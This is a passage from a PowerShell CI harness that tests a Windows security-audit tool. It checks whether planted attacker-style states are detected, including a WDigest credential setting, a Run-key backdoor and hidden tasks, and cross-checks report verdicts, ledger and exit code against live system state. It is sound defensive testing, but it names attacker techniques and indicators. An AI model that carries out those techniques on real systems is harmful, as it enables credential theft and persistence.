    # finding. It must read [INFO].
    $badCrit = [bool]([regex]::IsMatch($text, '(?im)\[CRITICAL\][^\r\n]*section-level CRITICAL finding'))

    # REQUIRED (Div-2): FINDINGS COUNTED must not under-report the dashboard's
    # own tally. Dashboard ck checks (firewall/SMBv1/RDP/...) can raise the exit
    # code without a section bumping FINDINGS; the reconciliation floor keeps the
    # two consistent (no "FINDINGS COUNTED: 0" next to a code-8 exit). Compare
    # FINDINGS COUNTED against the dashboard's "N CRITICAL / M WARNING" line.
    $badFloor = $false
    $dash = [regex]::Match($text, '(\d+)\s+CRITICAL\s*/\s*(\d+)\s+WARNING')
    if ($dash.Success) {
        $dashCount = [int]$dash.Groups[1].Value + [int]$dash.Groups[2].Value
        $fcM = [regex]::Match($text, '(?m)^\s*FINDINGS COUNTED:\s*(\d+)')
        $fc  = if ($fcM.Success) { [int]$fcM.Groups[1].Value } else { -1 }
        $badFloor = ($fc -lt $dashCount)
    }

    # REQUIRED: no section may print a finding it never raised.
    #
    # This is the invariant that a retrospective found broken on ~25 checks at
    # once. A check would write '[CRITICAL] ...' straight into the report while
    # the ledger -- which drives the section verdict, FINDINGS COUNTED and the
    # exit code -- knew nothing about it, so the same section could print a
    # Cobalt Strike named pipe and then declare itself "CLEAN -- no issues
    # detected". Every one of this harness's own Expect patterns matched report
    # TEXT, so they all passed while the finding never reached a verdict.
    #
    # The rule: within a section body, a line that OPENS with [CRITICAL] or
    # [WARNING] is a finding, and that section's verdict must therefore read
    # ISSUES FOUND. Prose that merely mentions a tag does not open with it, and
    # anything before the first section banner (the TOP FINDINGS block, INIT) is
    # outside every section body and is skipped.
    $sectionMismatch = @()
    $curSec = 0
    $secHasFinding = $false
    foreach ($ln in ($text -split "`r?`n")) {
        $banner = [regex]::Match($ln, '^\s*\[(\d{1,2})/18\]\s')
        if ($banner.Success) {
            $curSec = [int]$banner.Groups[1].Value
            $secHasFinding = $false
            continue
        }
        if ($curSec -eq 0) { continue }
        $verdict = [regex]::Match($ln, '^\s*\[SECTION (\d{1,2})/18 RESULT:\s*(\S+)')
        if ($verdict.Success) {
            if ($secHasFinding -and $verdict.Groups[2].Value -notmatch '^ISSUES') {
                $sectionMismatch += ("Section {0} printed a finding but its verdict reads '{1}'" -f $verdict.Groups[1].Value, $verdict.Groups[2].Value)
            }
            $curSec = 0
            $secHasFinding = $false
            continue
        }
        if ($ln -match '^\s*\[(CRITICAL|WARNING)\]') { $secHasFinding = $true }
    }
    $badSectionSync = ($sectionMismatch.Count -gt 0)

    Write-Host ""
    Write-Host "== Detection scoreboard =="
    $requiredFail = 0
    $promote = 0
    $skippedRequired = @()
    foreach ($c in $cases) {
        if (-not $c.Planted) {
            # A plant that fails silently is a detection that stopped being
            # tested -- and a green job then means "we checked nothing here",
            # which is indistinguishable from "we checked and it was fine".
            # Only a case that DECLARES it may legitimately skip (because the
            # feature genuinely may be absent on a host) is allowed to; every
            # other failed plant is a harness regression and fails the job.
            if ($c.MaySkip) {
                Write-Host ("  [ SKIP     ] {0}  -- {1}" -f $c.Name, $c.MaySkip)
            } else {
                Write-Host ("  [ REGRESS  ] {0}  -- could not be planted, so this detection was NOT tested this run (undeclared skip)" -f $c.Name)
                $skippedRequired += $c.Name
                $requiredFail++
            }
            continue
        }
        $hit  = [bool]([regex]::IsMatch($text, $c.Expect))
        # Invert cases plant a BENIGN state: the pattern must be ABSENT
        # (false-positive guard); a match means the audit cried wolf.
        $pass = if ($c.Invert) { -not $hit } else { $hit }
        if ($c.Tier -eq 'required') {
            if ($pass) { Write-Host ("  [ OK       ] {0}" -f $c.Name) }
            elseif ($c.Invert) { Write-Host ("  [ REGRESS  ] {0}  -- false positive fired on a benign state" -f $c.Name); $requiredFail++ }
            else       { Write-Host ("  [ REGRESS  ] {0}  -- required detection no longer fires" -f $c.Name); $requiredFail++ }
        } else {
            if ($pass) { Write-Host ("  [ PROMOTE  ] {0}  -- now detected; move to the required tier" -f $c.Name); $promote++ }
            else       { Write-Host ("  [ gap      ] {0}  -- still a known gap (see code review)" -f $c.Name) }
        }
    }

    if ($skippedRequired.Count -gt 0) {
        Write-Host ""
        Write-Host ("  {0} required detection(s) went UNTESTED this run because their plant failed:" -f $skippedRequired.Count)
        foreach ($n in $skippedRequired) { Write-Host ("    - {0}" -f $n) }
    }

    Write-Host ""
    Write-Host "== Report integrity =="
    if ($badName) { Write-Host ("  [ REGRESS  ] report filename lacks a valid timestamp: '{0}' -- timestamp derivation broke (see the wmic-less fallback fix)" -f $report.Name); $requiredFail++ }
    else          { Write-Host ("  [ OK       ] report filename timestamp is well-formed ({0})" -f $report.Name) }
    if ($badFind) { Write-Host "  [ REGRESS  ] FINDINGS COUNTED missing or zero despite planted findings -- findings accumulator broke"; $requiredFail++ }
    else          { Write-Host "  [ OK       ] exit handler reports a non-zero findings count" }
    if ($badCrit) { Write-Host "  [ REGRESS  ] exit-8 escalation note emitted as [CRITICAL] -- top_findings.ps1 will re-list it as a phantom finding (should be [INFO])"; $requiredFail++ }
    else          { Write-Host "  [ OK       ] exit-8 escalation note is not a [CRITICAL] line (no phantom finding)" }
    if ($badFloor) { Write-Host ("  [ REGRESS  ] FINDINGS COUNTED ({0}) is below the dashboard tally ({1}) -- Div-2 reconciliation floor broke" -f $fc, $dashCount); $requiredFail++ }
    else           { Write-Host "  [ OK       ] FINDINGS COUNTED is not below the dashboard's CRITICAL/WARNING tally (Div-2 floor)" }
    if ($badLedger) { Write-Host "  [ REGRESS  ] findings ledger missing or has no WARNING|3| (HOSTS) entry -- :dz_finding plumbing broke (Option B PR 2)"; $requiredFail++ }
    else            { Write-Host "  [ OK       ] findings ledger populated by converted sites (HOSTS WARNING|3| present)" }
    if ($badSectionSync) {
        Write-Host "  [ REGRESS  ] a section printed a finding that never reached the ledger -- the section verdict, FINDINGS COUNTED and the exit code all understate what the audit saw:"
        foreach ($m in $sectionMismatch) { Write-Host ("               {0}" -f $m) }
        $requiredFail++
    }
    else { Write-Host "  [ OK       ] every section that printed a finding also declared ISSUES FOUND (nothing printed-but-unraised)" }

    # False-positive guard with a dynamic expectation: the summary's firewall
    # verdict must agree with what Get-NetFirewallProfile actually reports.
    # The old netsh text-scrape said "Firewall DISABLED" on any non-English
    # Windows (localized State strings); comparing against ground truth
    # catches any such divergence on whatever state this runner is in.
    Write-Host ""
    Write-Host "== False-positive guards (ground truth) =="
    $fwp = @(Get-NetFirewallProfile -EA SilentlyContinue)
    if ($fwp.Count -gt 0) {
        # Enum-robust (GpoBoolean): "True" means enabled; anything else is off.
        # Must NOT use `-not $_.Enabled` -- that is the idiom under test, so the
        # ground truth has to be computed independently of it.
        $fwAllOn = (@($fwp | Where-Object { "$($_.Enabled)" -ne 'True' }).Count -eq 0)
        $saysOn  = [bool]([regex]::IsMatch($text, 'All firewall profiles enabled'))
        $saysOff = [bool]([regex]::IsMatch($text, 'Firewall DISABLED on'))
        if (($fwAllOn -and $saysOn -and -not $saysOff) -or (-not $fwAllOn -and $saysOff -and -not $saysOn)) {
            Write-Host ("  [ OK       ] firewall verdict matches Get-NetFirewallProfile ground truth (all profiles on: {0})" -f $fwAllOn)
        } else {
            Write-Host ("  [ REGRESS  ] firewall verdict disagrees with ground truth (all on: {0}; report says PASS: {1}, CRIT: {2})" -f $fwAllOn, $saysOn, $saysOff)
            $requiredFail++
        }
    } else {
        Write-Host "  [ SKIP     ] Get-NetFirewallProfile unavailable on this host -- consistency check skipped"
    }
    # Option B (dashboard retrofit): Section 8 now owns the firewall verdict, so
    # a disabled profile must flip Section 8's OWN verdict to ISSUES FOUND and
    # land a CRITICAL|8| ledger entry -- not just appear in the dashboard rollup
    # (the flagship "Section 8 CLEAN while firewall disabled" divergence, fixed).
    if ($fwp.Count -gt 0 -and -not $fwAllOn) {
        $s8issues = [bool]([regex]::IsMatch($text, '\[SECTION 8/18 RESULT: ISSUES FOUND'))
        $lg8 = $false
        if ($ledger) { $lg8 = [bool](@(Get-Content -LiteralPath $ledger.FullName -EA SilentlyContinue | Where-Object { $_ -like 'CRITICAL|8|*' }).Count) }
        if ($s8issues -and $lg8) { Write-Host "  [ OK       ] Section 8 firewall verdict is ISSUES FOUND + ledger has CRITICAL|8| (dashboard retrofit)" }
        else { Write-Host ("  [ REGRESS  ] disabled firewall did not flip Section 8's own verdict/ledger (verdict={0} ledger={1})" -f $s8issues, $lg8); $requiredFail++ }
    }
    # Option B retrofit (PR 7): Section 12 now evaluates WDigest in-section, so
    # the planted UseLogonCredential=1 must flip Section 12's OWN verdict and
    # land a CRITICAL|12| ledger entry (previously only the dashboard saw it).
    $s12issues = [bool]([regex]::IsMatch($text, '\[SECTION 12/18 RESULT: ISSUES FOUND'))
    $lg12 = $false
    if ($ledger) { $lg12 = [bool](@(Get-Content -LiteralPath $ledger.FullName -EA SilentlyContinue | Where-Object { $_ -like 'CRITICAL|12|*' }).Count) }
    if ($s12issues -and $lg12) { Write-Host "  [ OK       ] Section 12 WDigest verdict is ISSUES FOUND + ledger has CRITICAL|12| (dashboard retrofit)" }
    else { Write-Host ("  [ REGRESS  ] planted WDigest did not flip Section 12's own verdict/ledger (verdict={0} ledger={1})" -f $s12issues, $lg12); $requiredFail++ }

    # Option B retrofit (PR 10): Section 5 now evaluates Winlogon Userinit in
    # -section. Compare against the live value (read-only ground truth -- we
    # never repoint Userinit on the runner; that could break logon).
    $wlUi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name Userinit -EA SilentlyContinue).Userinit
    if ($wlUi) {
        $uiModified = ($wlUi.Trim().TrimEnd(',') -ine (Join-Path $env:SystemRoot 'system32\userinit.exe'))
        $rptUi = [bool]([regex]::IsMatch($text, '\[CRITICAL\] Winlogon Userinit MODIFIED'))
        if ($uiModified -eq $rptUi) { Write-Host ("  [ OK       ] Section 5 Winlogon Userinit verdict matches live value (modified: {0})" -f $uiModified) }
        else { Write-Host ("  [ REGRESS  ] Section 5 Userinit verdict disagrees with live value (modified: {0}; report flags: {1})" -f $uiModified, $rptUi); $requiredFail++ }
    } else {
        Write-Host "  [ SKIP     ] Winlogon Userinit not readable -- Section 5 check skipped"
    }

    # REQUIRED (Option B flip step 1 of 2): section verdicts and FINDINGS
    # COUNTED now derive from the ledger. Cross-check all 18 sections: a
    # section with >=1 ledger entry must report ISSUES FOUND, a section with
    # none must not -- on whatever state this runner is in, planted or organic.
    if ($ledger) {
        $secBad = 0
        for ($n = 1; $n -le 18; $n++) {
            $inLedger = [bool](@($lg | Where-Object { $_ -match ('^(CRITICAL|WARNING)\|{0}\|' -f $n) }).Count)
            $issues = [bool]([regex]::IsMatch($text, ('\[SECTION {0}/18 RESULT: ISSUES FOUND' -f $n)))
            if ($inLedger -ne $issues) {
                Write-Host ("  [ REGRESS  ] Section {0}: ledger has findings={1} but report verdict shows issues={2} -- ledger-derived verdict diverged" -f $n, $inLedger, $issues)
                $secBad++
            }
        }
        if ($secBad -eq 0) { Write-Host "  [ OK       ] all 18 section verdicts agree with the ledger (flip step 1)" }
        else { $requiredFail++ }

        # REQUIRED: FINDINGS COUNTED must equal the ledger line count, and the
        # dashboard-divergence floor must NOT have fired -- the floor kicking
        # in means a dashboard condition is missing its in-section raise.
        $fcL = [regex]::Match($text, '(?m)^\s*FINDINGS COUNTED:\s*(\d+)')
        if ($fcL.Success -and ([int]$fcL.Groups[1].Value) -eq @($lg).Count) {
            Write-Host ("  [ OK       ] FINDINGS COUNTED ({0}) equals the ledger line count (flip step 1)" -f @($lg).Count)
        } else {
            Write-Host ("  [ REGRESS  ] FINDINGS COUNTED ({0}) != ledger line count ({1}) -- count is no longer ledger-derived" -f $fcL.Groups[1].Value, @($lg).Count)
            $requiredFail++
        }
        if ($text -match 'an in-section raise is missing') {
            Write-Host "  [ REGRESS  ] dashboard floor fired -- some dashboard condition has no in-section raise (retrofit gap)"; $requiredFail++
        } else {
            Write-Host "  [ OK       ] dashboard-vs-ledger divergence floor did not fire (retrofit coverage holds)"
        }

        # REQUIRED (Option B flip step 2 of 2): the exit code derives from
        # ledger MAXSEV. Recompute MAXSEV from the raw ledger lines, cross-check
        # the footer's LEDGER MAXSEV, and -- since the planted WDigest CRITICAL
        # guarantees MAXSEV=CRITICAL this run -- require EXIT CODE: 8.
        $lgMax = 'NONE'
        if (@($lg | Where-Object { $_ -like 'CRITICAL|*' }).Count) { $lgMax = 'CRITICAL' }
        elseif (@($lg).Count) { $lgMax = 'WARNING' }
        $ftMax = [regex]::Match($text, '(?m)^\s*LEDGER MAXSEV:\s*(\S+)')
        if ($ftMax.Success -and $ftMax.Groups[1].Value -eq $lgMax) {
            Write-Host ("  [ OK       ] footer LEDGER MAXSEV ({0}) matches the ledger contents (flip step 2)" -f $lgMax)
        } else {
            Write-Host ("  [ REGRESS  ] footer LEDGER MAXSEV '{0}' disagrees with ledger contents '{1}'" -f $ftMax.Groups[1].Value, $lgMax); $requiredFail++
        }
        $ecM = [regex]::Match($text, '(?m)^\s*EXIT CODE:\s*(\d+)')
        if ($lgMax -eq 'CRITICAL') {
            if ($ecM.Success -and [int]$ecM.Groups[1].Value -eq 8) {
                Write-Host "  [ OK       ] exit code is 8 with ledger MAXSEV=CRITICAL (flip step 2)"
            } else {
                Write-Host ("  [ REGRESS  ] ledger MAXSEV is CRITICAL but exit code is '{0}' (expected 8) -- MAXSEV derivation broke" -f $ecM.Groups[1].Value); $requiredFail++
            }
        }
        # The retired channels (report [CRITICAL] census, dashboard CRIT token)
        # survive only as divergence alarms; either alarm firing means a check
        # signals CRITICAL without a matching :dz_finding raise.
        if ($text -match 'a raise is missing; exit code unaffected') {
            Write-Host "  [ REGRESS  ] retired-channel divergence alarm fired -- a CRITICAL signal has no ledger raise"; $requiredFail++
        } else {
            Write-Host "  [ OK       ] retired exit-code channels agree with the ledger (no divergence alarm)"
        }
    }

    # Option B retrofit (PR 9): Section 16 now evaluates log-tampering /
    # account-change events in-section. Compare its 1102 (Security log cleared)
    # verdict against a live Get-WinEvent probe -- NEVER clear a log on the
    # runner, so this is read-only ground truth.
    $ev1102 = $null
    try { $ev1102 = Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102} -MaxEvents 1 -EA Stop } catch {}
    $cleared = [bool]$ev1102
    $rptCleared = [bool]([regex]::IsMatch($text, '\[CRITICAL\] Security event log was CLEARED'))
    if ($cleared -eq $rptCleared) { Write-Host ("  [ OK       ] Section 16 log-cleared verdict matches live Security 1102 state (cleared: {0})" -f $cleared) }
    else { Write-Host ("  [ REGRESS  ] Section 16 log-cleared verdict disagrees with live 1102 state (cleared: {0}; report flags: {1})" -f $cleared, $rptCleared); $requiredFail++ }

    # Option B retrofit (PR 8): Section 13 now evaluates UAC in-section. Compare
    # its verdict against the live EnableLUA value (non-invasive ground truth --
    # we never disable UAC on the runner).
    $lua = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name EnableLUA -EA SilentlyContinue).EnableLUA
    if ($null -ne $lua) {
        $uacOff = ($lua -eq 0)
        $rptUacOff = [bool]([regex]::IsMatch($text, '\[CRITICAL\] UAC DISABLED'))
        if ($uacOff -eq $rptUacOff) { Write-Host ("  [ OK       ] Section 13 UAC verdict matches live EnableLUA (disabled: {0})" -f $uacOff) }
        else { Write-Host ("  [ REGRESS  ] Section 13 UAC verdict disagrees with EnableLUA (disabled: {0}; report flags: {1})" -f $uacOff, $rptUacOff); $requiredFail++ }
    } else {
        Write-Host "  [ SKIP     ] EnableLUA not readable -- Section 13 UAC check skipped"
    }

    # Option B retrofit (PR 6): Section 10 now evaluates WinRM in-section. Its
    # report line must agree with the live service state (non-invasive ground
    # truth) -- validates the retrofit eval logic without planting.
    $winrm = Get-Service WinRM -EA SilentlyContinue
    if ($winrm) {
        $wrun = ($winrm.Status -eq 'Running')
        $rptWinrm = [bool]([regex]::IsMatch($text, '\[WARNING\] WinRM RUNNING'))
        if ($wrun -eq $rptWinrm) { Write-Host ("  [ OK       ] Section 10 WinRM verdict matches live service state (running: {0})" -f $wrun) }
        else { Write-Host ("  [ REGRESS  ] Section 10 WinRM verdict disagrees with service state (running: {0}; report flags: {1})" -f $wrun, $rptWinrm); $requiredFail++ }
    } else {
        Write-Host "  [ SKIP     ] WinRM service not present -- Section 10 WinRM check skipped"
    }

    # Advanced-actor round: Section 16 audit-policy visibility must agree with
    # the live command-line-logging registry key (locale-independent ground
    # truth). We never toggle audit policy on the runner -- disabling auditing
    # is exactly what this check warns about -- so this is read-only.
    $cmdKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit'
    $cmdOn  = ((Get-ItemProperty -Path $cmdKey -Name 'ProcessCreationIncludeCmdLine_Enabled' -EA SilentlyContinue).ProcessCreationIncludeCmdLine_Enabled -eq 1)
    $rptCmdOn  = [bool]([regex]::IsMatch($text, 'command-line logging is ENABLED'))
    $rptCmdOff = [bool]([regex]::IsMatch($text, 'command-line logging is DISABLED'))
    if ($cmdOn -eq $rptCmdOn -and $cmdOn -ne $rptCmdOff) { Write-Host ("  [ OK       ] Section 16 audit-policy verdict matches live cmdline-logging key (enabled: {0})" -f $cmdOn) }
    else { Write-Host ("  [ REGRESS  ] Section 16 audit-policy verdict disagrees with cmdline key (live enabled: {0}; report ENABLED={1} DISABLED={2})" -f $cmdOn, $rptCmdOn, $rptCmdOff); $requiredFail++ }

    # Tier 0 truthful reporting: the preamble and the coverage block must be in
    # every report, and the at-risk-user referral must survive. A clean run that
    # silently drops these is a safety regression, so they are required.
    if ([regex]::IsMatch($text, 'READ THIS FIRST')) { Write-Host "  [ OK       ] Tier 0 preamble present (READ THIS FIRST)" }
    else { Write-Host "  [ REGRESS  ] Tier 0 preamble missing -- clean results could read as a safety guarantee"; $requiredFail++ }
    if ([regex]::IsMatch($text, 'COVERAGE & CONFIDENCE')) { Write-Host "  [ OK       ] Tier 0 COVERAGE & CONFIDENCE block present" }
    else { Write-Host "  [ REGRESS  ] Tier 0 COVERAGE & CONFIDENCE block missing"; $requiredFail++ }
    if ([regex]::IsMatch($text, 'accessnow\.org/help')) { Write-Host "  [ OK       ] at-risk-user expert-help referral present" }
    else { Write-Host "  [ REGRESS  ] expert-help referral missing from the report"; $requiredFail++ }

    # Baseline/diff (novel-actor detection): the seeded baseline lacks the
    # planted Run-key backdoor, so the audit's automatic diff must report it as
    # a NEW autorun. This proves the -baseline wiring end-to-end: snapshot read,
    # diff computed, finding raised into the ledger under section 17.
    if ([regex]::IsMatch($text, '(?im)NEW autorun/persistence value since baseline')) {
        Write-Host "  [ OK       ] baseline diff reported the planted autorun as NEW"
    } else {
        Write-Host "  [ REGRESS  ] baseline diff did not report a NEW autorun despite a seeded pre-plant baseline"; $requiredFail++
    }
    if ($ledger -and @($lg | Where-Object { $_ -like '*|17|BASELINE|*' }).Count) {
        Write-Host "  [ OK       ] baseline finding reached the ledger (section 17, BASELINE)"
    } else {
        Write-Host "  [ REGRESS  ] no BASELINE ledger entry -- baseline finding did not reach the finding model"; $requiredFail++
    }

    # Cross-API rootkit check + loaded-module inspection: both must RUN in the
    # audit (proving the bat wiring), and neither may cry rootkit on a healthy
    # runner. The false-positive half matters most here: process and service
    # tables churn constantly, so a cross-API check without working race
    # re-verification would fire on every clean machine and be worse than
    # useless -- users would learn to ignore it.
    if ([regex]::IsMatch($text, 'Process lists agree across .NET, WMI and tasklist')) {
        Write-Host "  [ OK       ] cross-API process check ran and agreed on a healthy runner"
    } elseif ([regex]::IsMatch($text, 'Process enumeration cross-check')) {
        Write-Host "  [ REGRESS  ] cross-API process check ran but did NOT agree -- phantom hidden process (race re-verification broken)"; $requiredFail++
    } else {
        Write-Host "  [ REGRESS  ] cross-API process check did not run -- Section 17 wiring broken"; $requiredFail++
    }
    if ([regex]::IsMatch($text, 'Service views agree across SCM, WMI and registry')) {
        Write-Host "  [ OK       ] cross-API service check ran and agreed on a healthy runner"
    } else {
        Write-Host "  [ REGRESS  ] cross-API service check missing or disagreeing on a healthy runner"; $requiredFail++
    }
    if ([regex]::IsMatch($text, 'Loaded-module inspection|unique module\(s\) across')) {
        Write-Host "  [ OK       ] loaded-module inspection ran (Section 4 wiring)"
    } else {
        Write-Host "  [ REGRESS  ] loaded-module inspection did not run -- Section 4 wiring broken"; $requiredFail++
    }
    # Tarrask: no task on a clean runner should be missing its security
    # descriptor. If this fires here it is either a real hidden task or a bug --
    # both need eyes, so it is required.
    if ([regex]::IsMatch($text, 'NO security descriptor')) {
        Write-Host "  [ REGRESS  ] a scheduled task on the runner has no SD (Tarrask indicator or false positive) -- investigate"; $requiredFail++
    } else {
        Write-Host "  [ OK       ] no Tarrask-style hidden task (all tasks carry a security descriptor)"
    }

    # Covert-monitoring module: the camera/mic/location inventory exists to
    # INFORM someone who may be monitored, not to accuse. Holding a webcam
    # permission is ordinary, so the audit must never turn that inventory into a
    # verdict -- a false accusation here lands on someone already frightened.
    if ([regex]::IsMatch($text, '(?im)^\s*\[(WARNING|CRITICAL)\][^\r\n]*application permission')) {
        Write-Host "  [ REGRESS  ] camera/mic permission inventory was raised as a finding -- it must stay informational"; $requiredFail++
    } else {
        Write-Host "  [ OK       ] camera/mic/location inventory stayed informational (no accusation from ordinary permissions)"
    }
    if ([regex]::IsMatch($text, 'Covert Monitoring|covert-monitoring|sign-in screen')) {
        Write-Host "  [ OK       ] covert-monitoring check ran (Section 10 wiring)"
    } else {
        Write-Host "  [ REGRESS  ] covert-monitoring check did not run -- Section 10 wiring broken"; $requiredFail++
    }

    # ATT&CK coverage matrix: it must appear in the report (Section wiring) and,
    # because a planted WDigest CRITICAL is T1550.002/T1003.001, at least one
    # technique must be marked as having fired this run -- proving the
    # per-run annotation reflects real findings, not a static list.
    if ([regex]::IsMatch($text, 'ATT&CK COVERAGE MATRIX')) {
        Write-Host "  [ OK       ] ATT&CK coverage matrix present in the report"
    } else {
        Write-Host "  [ REGRESS  ] ATT&CK coverage matrix missing -- attack_matrix wiring broken"; $requiredFail++
    }
    if ([regex]::IsMatch($text, 'Every technique the audit references is mapped')) {
        Write-Host "  [ OK       ] coverage matrix reports itself complete (no unmapped techniques)"
    } else {
        Write-Host "  [ REGRESS  ] coverage matrix reports unmapped techniques -- ttp_manifest drifted from the code"; $requiredFail++
    }

    # Emulation corpus consistency, checked live against the very sources and
    # harness this run used: every CORE detection must have a plant and no tag
    # may reference a technique the audit no longer detects. This is the
    # test-coverage analogue of the ATT&CK matrix's completeness gate.
    $ecTool = Join-Path (Split-Path -Parent $PSCommandPath) '..\tools\emulation_coverage.ps1'
    if (Test-Path -LiteralPath $ecTool) {
        $ecRepo = (Resolve-Path (Join-Path (Split-Path -Parent $PSCommandPath) '..')).Path
        $ecOut = (& $ecTool -SourceDir $ecRepo) -join "`n"
        if ($ecOut -match 'Emulation corpus is consistent') {
            Write-Host "  [ OK       ] emulation corpus is consistent (every core detection has a plant; no stale tags)"
        } else {
            Write-Host "  [ REGRESS  ] emulation corpus drifted -- a core detection lost its plant or a tag is stale"; $requiredFail++
        }
    }

    # Boot-chain audit (T1542): read-only ground truth. Compare the report's
    # nointegritychecks verdict against live bcdedit -- we never toggle boot
    # integrity flags on the runner (they need a reboot and can break boot).
    $bcdOut = ''
    try { $bcdOut = (& bcdedit /enum ALL 2>$null | Out-String) } catch {}
    if ($bcdOut) {
        $niLive = [bool]([regex]::IsMatch($bcdOut, '(?im)^\s*nointegritychecks\s+Yes\b'))
        $niRpt  = [bool]([regex]::IsMatch($text, 'nointegritychecks = Yes'))
        if ($niLive -eq $niRpt) { Write-Host ("  [ OK       ] boot-chain nointegritychecks verdict matches live bcdedit (set: {0})" -f $niLive) }
        else { Write-Host ("  [ REGRESS  ] boot-chain nointegritychecks verdict disagrees with bcdedit (live: {0}; report flags: {1})" -f $niLive, $niRpt); $requiredFail++ }
    } else {
        Write-Host "  [ SKIP     ] bcdedit unavailable -- boot-chain nointegritychecks ground-truth check skipped"
    }
    if ([regex]::IsMatch($text, 'Boot-chain configuration audit')) {
        Write-Host "  [ OK       ] boot-chain audit ran (Section 13 wiring)"
    } else {
        Write-Host "  [ REGRESS  ] boot-chain audit did not run -- Section 13 wiring broken"; $requiredFail++
    }

    # RETROSPECTIVE REGRESSION GUARDS. A three-pass retrospective found the tool
    # still asserting safety it cannot verify, in the most-read part of the
    # report. Tier 0 exists to prevent exactly that, so these are required: the
    # phrasing must never come back, in any section, on any run.
    foreach ($claim in @('System appears clean', 'No active compromise found', 'security posture is good')) {
        if ([regex]::IsMatch($text, [regex]::Escape($claim))) {
            Write-Host ("  [ REGRESS  ] report asserts unverifiable safety: '{0}' -- a user-mode audit cannot support this claim" -f $claim); $requiredFail++
        } else {
            Write-Host ("  [ OK       ] report does not assert '{0}'" -f $claim)
        }
    }
    # The ATT&CK matrix's per-run FIRED annotation must come from the ledger, not
    # from grepping report text: ~14 section headers print technique ids
    # unconditionally, so a text scan marks every technique as fired even on a
    # clean machine. Assert the matrix never claims MORE techniques fired than
    # the ledger actually recorded.
    if ($ledger) {
        $ledgerCodes = @{}
        foreach ($l in $lg) { $lf = $l.Split('|'); if ($lf.Count -ge 3 -and $lf[2] -match '^T1\d{3}(\.\d{3})?$') { $ledgerCodes[$lf[2]] = $true } }
        $firedM = [regex]::Match($text, '(?m)^Of those, (\d+) raised at least one finding')
        if ($firedM.Success) {
            $claimedFired = [int]$firedM.Groups[1].Value
            if ($claimedFired -le @($ledgerCodes.Keys).Count) {
                Write-Host ("  [ OK       ] ATT&CK matrix fired-count ({0}) is consistent with the ledger ({1} technique codes)" -f $claimedFired, @($ledgerCodes.Keys).Count)
            } else {
                Write-Host ("  [ REGRESS  ] ATT&CK matrix claims {0} techniques fired but the ledger records only {1} -- fired-annotation is not ledger-derived" -f $claimedFired, @($ledgerCodes.Keys).Count); $requiredFail++
            }
        }
    }

    # Exit-code architecture (code-review W1-W3): a planted CRITICAL (WDigest=1)
    # must drive the process exit code to 8. PROMOTED to required 2026-07-18
    # after it fired on CI -- the path is exactly the fragile summary block W3
    # warns about, which is why it needs a tripwire: anyone touching that block
    # and losing CRITICAL propagation fails this job immediately.
    Write-Host ""
    Write-Host "== Exit-code accounting =="
    if ($runExit -eq 8) { Write-Host "  [ OK       ] planted CRITICAL drove the exit code to 8" }
    elseif ($runExit -ne 0 -and $runExit -ne $null) { Write-Host ("  [ REGRESS  ] audit exited {0}, not 8 -- CRITICAL severity was lost on the way to the exit code" -f $runExit); $requiredFail++ }
    else { Write-Host "  [ REGRESS  ] audit exited clean (0) despite planted findings"; $requiredFail++ }

    Write-Host ""
    if ($requiredFail -gt 0) {
        Write-Host ("FAIL: {0} required detection(s) regressed." -f $requiredFail)
        exit 1
    }
    if ($promote -gt 0) {
        Write-Host ("OK (with {0} case(s) ready to PROMOTE from pending to required)." -f $promote)
    } else {
        Write-Host "OK: all required detections fired; known gaps unchanged."
    }
    exit 0
}
finally {
    Write-Host ""
    Write-Host "== Cleanup =="
    foreach ($c in $planted) {
        try { & $c.Cleanup; Write-Host ("  removed: {0}" -f $c.Name) }
        catch { Write-Host ("  WARNING: cleanup failed for {0}: {1}" -f $c.Name, $_.Exception.Message) }
    }
    # The seeded baseline is harness state, not a planted case -- remove it so
    # the runner is left exactly as found.
    if (Test-Path -LiteralPath $baselineFile) {
        Remove-Item -LiteralPath $baselineFile -Force -EA SilentlyContinue
        Write-Host "  removed: seeded baseline snapshot"
    }
}
